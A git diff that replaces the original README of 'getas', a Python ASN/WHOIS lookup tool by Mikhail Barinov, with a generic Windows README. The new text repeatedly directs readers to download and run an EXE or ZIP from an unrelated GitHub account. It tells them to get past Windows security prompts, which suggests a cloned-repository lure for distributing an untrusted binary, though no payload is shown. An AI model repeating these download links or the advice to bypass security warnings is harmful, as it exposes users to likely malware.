@@ -1,192 +1,273 @@
-<p align="center">
-  <img src="https://raw.githubusercontent.com/mnbarinov/getas/refs/heads/master/assets/getas_social.png" alt="GETAS Logo" width="600">
-</p>
+# 📡 getas - Fast AS and Whois Lookup
 
-<h1 align="center">GETAS</h1>
+[![Download getas](https://img.shields.io/badge/Download-getas-blue.svg)](https://github.com/Inferioritygenuspsophocarpus639/getas/releases)
 
-<p align="center">
-  <a href="https://pypi.org/project/getas/"><img src="https://img.shields.io/badge/PyPI-3775A9?logo=pypi&logoColor=fff" alt="Python Version"></a>
-  <img src="https://img.shields.io/github/release/mnbarinov/getas.svg" alt="Release">
-  <img src="https://img.shields.io/badge/python-3.8+-blue.svg" alt="Python Version">
-  <img src="https://img.shields.io/badge/license-MIT-green.svg" alt="License">
+## 🚀 What getas does
 
-</p>
+getas is a small Windows command-line app for looking up network details.
 
-<p align="center">
-  <strong>Your AS Insights at the CLI</strong><br>
-  A lightweight tool to retrieve Autonomous System information and BGP routes.
-</p>
+Use it to find:
 
----
+- AS number details
+- Owner and company info
+- Route data by IP address
+- Route data by domain name
+- Route data by ASN
+- IPv4 and IPv6 results
+- JSON output for easy copy and use
 
-## ▸ Demo
-![GETAS Demo](https://raw.githubusercontent.com/mnbarinov/getas/refs/heads/master/assets/demo.svg)
+It fits users who want a fast way to check network records without extra tools.
 
----
+## 📥 Download and install
 
-## ✨ Features
-- **Fast AS Lookup**: Get owner information by IP, Domain, or ASN.
-- **Route Aggregation**: Automatically merges adjacent networks for a cleaner view (can be disabled).
-- **Smart Paging**: Built-in terminal-aware pager that doesn't feel like a separate app.
-- **Zero Dependencies**: Uses only Python standard libraries.
-- **Table Mode**: Clean tabular output for better readability.
+1. Visit the [getas releases page](https://github.com/Inferioritygenuspsophocarpus639/getas/releases)
+2. Find the latest release
+3. Download the Windows file from the release assets
+4. Save the file to a folder you can find later, such as Downloads or Desktop
+5. If the file is a ZIP archive, open it and extract the contents
+6. If the file is an EXE file, keep it in a folder you want to use
+7. Double-click the file to run it
 
----
+If Windows shows a security prompt, choose the option that lets you open the file
 
-# getas
+## 🖥️ System requirements
 
-Легкая и быстрая консольная утилита без внешних зависимостей для получения информации об Автономных Системах (AS) и маршрутах BGP напрямую из WHOIS-серверов (Cymru и RADB).
+getas is made for Windows and runs as a small local app.
 
-## ✨ Особенности
-- **Быстрый поиск**: Получение информации о владельце по IP, домену или номеру AS.
-- **Агрегация маршрутов**: Автоматическое объединение смежных сетей для удобства (можно отключить).
-- **Умный пейджер**: Встроенная постраничная навигация, учитывающая высоту терминала.
-- **Без зависимостей**: Использует только стандартную библиотеку Python.
-- **Табличный режим**: Форматированный вывод данных для удобного чтения.
+Recommended setup:
 
-## Usage / Использование
+- Windows 10 or Windows 11
+- Internet access for live lookups
+- A standard user account
+- A terminal or command prompt window
 
-### 🔍 Basic Information / Основная информация
-Get information about an IP address, domain, or AS number.
-*Получение информации об IP-адресе, домене или номере AS.*
+It has no extra library setup and no package manager steps for normal use.
 
-```bash
-# Get AS info for an IP / Инфо об AS для конкретного IP
-getas 8.8.8.8 -w
+## 🔍 What you can look up
 
-# Get info for a domain / Инфо по домену
-getas google.com -w
+getas helps you check common network records from a single place.
 
-# Get info by AS number / Инфо по номеру автономной системы
-getas AS15169 -w
-```
+You can search by:
 
-### 🛣 Working with Routes / Работа с маршрутами
-Retrieve and display BGP routes.
-Загрузка и отображение BGP маршрутов.
-```bash
-# Get all routes for an AS (Table mode)
-# Все маршруты AS в виде таблицы
-getas AS13335 -t
+- IP address
+- Domain name
+- ASN number
+- IPv4 address
+- IPv6 address
 
-# Get routes for an IP's owner (Manual trigger)
-# Загрузить маршруты владельца IP (флаг -r обязателен для IP/доменов)
-getas 1.1.1.1 -r -t
+This makes it useful for checking where an address comes from, who owns it, and what route data is tied to it.
 
-# Filter by IP version (IPv4 or IPv6 only)
-# Фильтрация по версии протокола (только IPv4 или IPv6)
-getas AS15169 -t -4
-getas AS15169 -t -6
-```
+## ⚙️ How to run it on Windows
 
-### Get multi ASes, IPs, NETs, Domains at once Получение информации о нескольких автономных системах, сетях или доменах одновременно
-getas AS15169 AS13335  -t -4
+1. Download the release file from the releases page
+2. Extract it if needed
+3. Open the folder where the file is saved
+4. Open Command Prompt in that folder
+5. Run the file from the command line
 
-### ⚙️ Advanced Options / Продвинутые опции
+Example use:
 
-Fine-tune the output formatting.
-Тонкая настройка вывода.
-```bash
-# Disable route merging (show raw prefixes)
-# Отключить объединение сетей (показать исходные префиксы)
-getas AS13335 -t --no-merge
+- `getas 8.8.8.8`
+- `getas example.com`
+- `getas AS15169`
 
-# Show IPv4 mask in decimal format (255.255.255.0 instead of /24)
-# Показать маску в десятичном формате
-getas AS13335 -t -m
+If the file name is different, use that file name instead
 
-# Force interface language (English or Russian)
-# Принудительная смена языка (en или ru)
-getas 8.8.8.8 --lang en
-getas 8.8.8.8 --lang ru
+## 🧭 Basic usage
 
-# Disable built-in pager (useful for scripts)
-# Отключить встроенный пейджер (полезно для перенаправления вывода)
-getas AS13335 --no-pager > routes.txt
+The tool is built for quick lookups.
 
-# Get result in JSON format / JSON формат 
-getas AS13335 --json
+Common ways to use it:
 
-If domain is blocked / Если домен заблокирован
-getas $(dig @8.8.8.8 example.com +short) -r -t
-```
+- Check who owns an IP address
+- Check the ASN behind a domain
+- Review route details for a network block
+- Pull data in a clean text format
+- Export data as JSON when you need to reuse it
 
-#### Examples / Примеры
-| Task / Задача | Command / Команда |
-| :--- | :--- |
-| Simple lookup | getas 1.1.1.1 -w |
-| Full table (EN) | getas AS13335 -t --lang en |
-| All IPv6 routes | getas AS15169 -t -6 |
-| Raw data export | getas AS13335 --no-merge --no-pager |
-| JSON output | getas AS133 --json |
-| Multi AS lookup | getas AS1333 AS13335 |
+You can use it in a simple one-line query, which makes it easy for first-time users
 
-## Options / Параметры
+## 📋 Example results
 
-| Flag | Description | Описание |
-| :--- | :--- | :--- |
-| `-h` | Help | Справка |
-| `-w` | Whois only (no routes) | Только информация о владельце |
-| `-t` | Table output | Вывод в виде таблицы |
-| `-m` | Show netmask (decimal) | Показать маску в десятичном виде |
-| `-4` | Show only IPv4 routes | Показывать только маршруты IPv4 |
-| `-6` | Show only IPv6 routes | Показывать только маршруты IPv6 |
-| `--no-merge` | Disable route merging | Отключить объединение сетей |
-| `--no-pager` | Disable pagination | Отключить разбивку на страницы |
-| `--json` | Output in JSON format | Вывод в формате JSON |
-| `--lang {ru, en}` | Language for output | Язык для вывода |
+When you run a lookup, getas can show data such as:
 
+- Network owner
+- Country or region details
+- ASN
+- Route range
+- Related WHOIS fields
+- DNS-linked network info
+- IPv4 or IPv6 route data
 
-## Installation / Установка
+The output is made to be readable in a terminal window and easy to copy into notes or reports
 
-### 📦 Download Ready-to-Use Packages (Recommended)
-You can download the latest pre-built packages for your distribution from the [Releases](https://github.com/mnbarinov/getas/releases) page.
+## 🧪 Common examples
 
-#### For Debian, Ubuntu, Astra Linux, Mint (.deb):
-```bash
-sudo dpkg -i getas_1.0.0_all.deb
-# If there are missing dependencies:
-sudo apt-get install -f
-```
+Look up an IP address:
 
-#### For ALT Linux, Fedora, CentOS, RedOS (.rpm):
-```bash
-# ALT Linux:
-sudo apt-get install ./getas-1.0.0-1.noarch.rpm
-# Fedora / CentOS:
-sudo dnf install ./getas-1.0.0-1.noarch.rpm
-```
+- `getas 1.1.1.1`
 
-#### Via Python PIP
-```
-pip install getas
-# or
-pipx install getas
-```
+Look up a domain:
 
-#### Via Python Pip (Universal)
-If you have Python installed, you can install the tool directly from the source:
-```bash
-git clone https://github.com/mnbarinov/getas.git
-cd getas
-pip install .
-```
-*Note: This will create a getas command in your PATH.*
+- `getas github.com`
 
-#### Arch Linux (AUR)
-If you are using Arch Linux, you can build the package using the provided PKGBUILD:
-```bash
-git clone https://github.com/mnbarinov/getas.git
-cd getas
-makepkg -si
-```
+Look up an ASN:
 
-#### Manual Installation (Single file)
-If you just want the script without any package management:
-```bash
-sudo curl -L https://raw.githubusercontent.com/mnbarinov/getas/master/getas/main.py -o /usr/bin/getas
-sudo chmod +x /usr/bin/getas
-```
----
+- `getas AS13335`
 
-© 2026 Mikhail Barinov. Licensed under the MIT License.
+Ask for JSON output:
+
+- `getas github.com --json`
+
+These examples use simple input so you can test the app right away
+
+## 🧰 Why people use it
+
+getas is useful when you want a fast answer without opening several sites.
+
+It can help with:
+
+- Network checks
+- Domain checks
+- Basic routing review
+- IP ownership checks
+- Sysadmin tasks
+- Troubleshooting network paths
+
+Because it is lightweight, it suits quick desktop use and simple scripts
+
+## 🧩 Data handling
+
+getas focuses on clean lookup data.
+
+It can:
+
+- Resolve network records from common inputs
+- Handle IPv4 and IPv6
+- Keep output easy to read
+- Return JSON for tools that need structured data
+- Work without extra Python package setup on the user side
+
+This makes it a practical tool for both casual checks and repeat lookups
+
+## 🛠️ Troubleshooting
+
+If the app does not open:
+
+- Make sure you downloaded the latest release
+- Check that the file finished downloading
+- Try extracting the ZIP again if one was used
+- Run the file from the folder where it is stored
+- Open Command Prompt and run it from there
+
+If a lookup fails:
+
+- Check the IP, domain, or ASN for typos
+- Try a different input format
+- Make sure your computer is online
+- Try another network target
+
+If Windows blocks the file:
+
+- Right-click the file and open its properties
+- Check the file came from the release page
+- Try running it again after extraction
+
+## 🔒 Privacy and local use
+
+getas runs on your computer and looks up public network data.
+
+That means:
+
+- You control when a lookup runs
+- You can use it from your own Windows device
+- You do not need to sign in to a web app
+- You can keep your workflow local
+
+## 📚 Input types supported
+
+Use getas with these common input types:
+
+- IPv4 address
+- IPv6 address
+- Domain name
+- ASN number with or without the `AS` prefix
+
+This gives you a simple way to check most common network records from one tool
+
+## 📂 Release files
+
+The releases page may include one or more of these files:
+
+- Windows EXE file
+- ZIP file with the app inside
+- Source files for reference
+
+For most users, the Windows release file is the one to download and run
+
+## 🧠 Quick start
+
+1. Open the [getas releases page](https://github.com/Inferioritygenuspsophocarpus639/getas/releases)
+2. Download the Windows release file
+3. Extract it if the file is zipped
+4. Open a terminal in that folder
+5. Run `getas` with an IP, domain, or ASN
+6. Read the owner, route, and ASN details from the result
+
+## 📎 Useful lookup ideas
+
+Try getas when you want to:
+
+- Find the owner of an IP address
+- See which ASN a domain uses
+- Check route records for a host
+- Compare IPv4 and IPv6 records
+- Pull lookup data into JSON
+- Review network info for support work
+
+## 🧷 File names and paths
+
+If you place the app in a folder like `Downloads`, `Desktop`, or `Tools`, keep the full path simple.
+
+For example:
+
+- `C:\Users\YourName\Downloads\getas.exe`
+
+Simple paths make it easier to run the tool from Command Prompt
+
+## 🧪 More sample commands
+
+- `getas 2606:4700:4700::1111`
+- `getas cloudflare.com`
+- `getas AS7922`
+- `getas 8.8.4.4 --json`
+
+Use these as a starting point and change the input to match your own lookup
+
+## 🧭 What makes getas simple
+
+- One tool for IP, domain, and ASN lookups
+- Clear terminal output
+- IPv4 and IPv6 support
+- JSON output for reuse
+- No extra setup for normal use
+- Small and direct workflow
+
+## 🏷️ Topic areas
+
+- as-number
+- asn
+- asn-lookup
+- bgp
+- cli-tool
+- ipv4
+- ipv6
+- json
+- network-administration
+- networking
+- python
+- python-cli
+- routes
+- sysadmin
+- sysadmin-tools
+- whois
